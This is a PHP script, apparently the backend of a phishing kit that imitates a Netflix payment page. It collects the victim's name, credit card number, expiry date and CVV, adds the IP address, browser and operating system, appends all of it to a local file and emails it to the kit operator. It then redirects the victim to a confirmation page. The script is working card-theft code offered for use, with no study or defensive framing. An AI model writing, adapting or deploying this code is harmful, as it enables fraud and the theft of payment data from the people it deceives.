<?php
$ip = getenv("REMOTE_ADDR");
include '../options/get_browser.php';
include '../settings/email.php';
$message .= "====================<[ Netflix Payment ]>====================\n";
$message .= "# First Name          : ".$_POST['firstname']."\n";
$message .= "# Last Name           : ".$_POST['lastname']."\n";
$message .= "# CC Number           : ".$_POST['cardnumber']."\n";
$message .= "# Expire Date         : ".$_POST['date']."\n";
$message .= "# Security Code CVV   : ".$_POST['cvv']."\n";
$message .= "====================<[ Personal Information ]>====================\n";
$message .= "# IP Address          : ".$ip."\n"; 
$message .= "# Browser             : ".$browser."\n";
$message .= "# System              : ".$os."\n";
$message .= "# User Agnet          : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "====================<[ Thanks by ArtCode ]>====================\n";
$cc = $_POST['ccn'];
$subject = "🖤 Netflix Card Information: [ $os - $browser - $ip ] ";
$headers = 'From: Martin <newlog@martin-flix.onion>' . "\r\n" .
$file = fopen("../stored.txt", 'a');
fwrite($file, $message);
mail($send,$subject,$message,$headers);

header("Location: ../ref-done.php");?>